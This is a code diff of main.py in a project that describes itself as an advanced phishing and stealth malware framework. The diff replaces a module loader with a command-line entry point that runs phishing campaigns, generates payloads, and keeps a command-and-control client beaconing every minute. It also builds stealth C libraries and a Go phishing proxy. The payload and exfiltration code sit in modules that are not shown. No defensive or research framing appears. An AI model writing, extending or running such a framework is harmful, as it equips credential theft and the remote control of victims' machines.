@@ -1,77 +1,103 @@
-# === main.py ===
+#!/usr/bin/env python3
+"""
+RedSentrix 2.0 - Advanced Phishing + Stealth Malware Framework
+Main entry point
+"""
 
-import os
-import importlib
-import subprocess
-import platform
-from redsentrix_core.logger import StealthLogger
-from redsentrix_core import stealth_utils
-from redsentrix_core.stealth_utils import StealthUtils
+import sys
+import argparse
+from pathlib import Path
 
-logger = StealthLogger()
-loaded_modules = set()
+# Add core to path
+sys.path.insert(0, str(Path(__file__).parent))
 
-def get_real_cpu_info():
-    """Robust CPU info extraction"""
-    try:
-        with open("/proc/cpuinfo", "r") as f:
-            for line in f:
-                if line.lower().startswith("model name"):
-                    cpu_model = line.split(":", 1)[1].strip()
-                    return cpu_model
-    except Exception as e:
-        StealthUtils.secure_print(f"[!] /proc/cpuinfo failed: {e}")
+from core.orchestrator import Orchestrator
+from core.logger import Logger
 
-    try:
-        output = subprocess.check_output("lscpu", shell=True, text=True)
-        for line in output.splitlines():
-            if "Model name" in line:
-                return line.split(":", 1)[1].strip()
-    except Exception as e:
-        StealthUtils.secure_print(f"[!] lscpu failed: {e}")
-
-    try:
-        proc = platform.processor()
-        if proc:
-            return proc
-    except Exception as e:
-        StealthUtils.secure_print(f"[!] platform.processor failed: {e}")
-
-    return "Unknown"
-
-def load_modules():
-    logger.log("main", "\U0001F50D Scanning for modules...")
-    modules_path = "modules"
-
-    for file in os.listdir(modules_path):
-        if file.endswith(".py") and not file.startswith("__"):
-            module_name = file[:-3]
-
-            if module_name in loaded_modules:
-                continue
-
-            try:
-                mod_path = f"{modules_path}.{module_name}"
-                module = importlib.import_module(mod_path)
-                if hasattr(module, "run"):
-                    logger.log("main", f"✅ Loaded module: {module_name}")
-                    module.run()
-                    loaded_modules.add(module_name)
-                    stealth_utils.random_sleep(100, 300)
-                else:
-                    logger.log("main", f"⚠️ Module {module_name} has no run() function.")
-            except Exception as e:
-                logger.log("main", f"[!] Error loading {module_name}: {str(e)}")
-                continue
 
 def main():
-    logger.log("main", "[+] Starting RedSentrix Framework...")
+    parser = argparse.ArgumentParser(description="RedSentrix 2.0 Framework")
+    parser.add_argument(
+        "-c", "--config",
+        default="config/phishing.yaml",
+        help="Configuration file path"
+    )
+    parser.add_argument(
+        "-m", "--mode",
+        choices=["phishing", "payload", "c2"],
+        default="phishing",
+        help="Operation mode"
+    )
+    parser.add_argument(
+        "--build",
+        action="store_true",
+        help="Build C libraries and Go binaries"
+    )
+    
+    args = parser.parse_args()
+    
+    logger = Logger()
+    logger.log("Starting RedSentrix 2.0...", "info")
+    
+    # Build if requested
+    if args.build:
+        logger.log("Building components...", "info")
+        build_components()
+    
+    # Initialize orchestrator
+    try:
+        orchestrator = Orchestrator(config_path=args.config)
+        
+        # Start based on mode
+        if args.mode == "phishing":
+            orchestrator.start()
+        elif args.mode == "payload":
+            # Generate payload only
+            payload = orchestrator.generate_phishing_payload()
+            print(f"Generated payload: {payload[:100]}...")
+        elif args.mode == "c2":
+            # C2 mode
+            orchestrator.connect_c2()
+            if orchestrator.c2_client:
+                while True:
+                    orchestrator.c2_client.beacon()
+                    import time
+                    time.sleep(60)
+        
+    except KeyboardInterrupt:
+        logger.log("Shutting down...", "info")
+        if 'orchestrator' in locals():
+            orchestrator.stop()
+    except Exception as e:
+        logger.log(f"Fatal error: {e}", "error")
+        sys.exit(1)
 
-    cpu_info = get_real_cpu_info()
-    logger.log("main", f"Processor: {cpu_info}")
 
-    load_modules()
-    logger.log("main", "[✓] RedSentrix execution complete.")
+def build_components():
+    """Build C libraries and Go binaries"""
+    import subprocess
+    from pathlib import Path
+    
+    # Build C libraries
+    stealth_dir = Path("stealth")
+    if stealth_dir.exists():
+        print("Building C stealth libraries...")
+        result = subprocess.run(["make", "-C", str(stealth_dir)], capture_output=True)
+        if result.returncode != 0:
+            print(f"Build failed: {result.stderr.decode()}")
+    
+    # Build Go phishing proxy
+    phishing_dir = Path("phishing")
+    if phishing_dir.exists():
+        print("Building Go phishing proxy...")
+        result = subprocess.run(
+            ["go", "build", "-o", "build/phishing/proxy", "./phishing/proxy"],
+            cwd=Path.cwd(),
+            capture_output=True
+        )
+        if result.returncode != 0:
+            print(f"Build failed: {result.stderr.decode()}")
+
 
 if __name__ == "__main__":
     main()
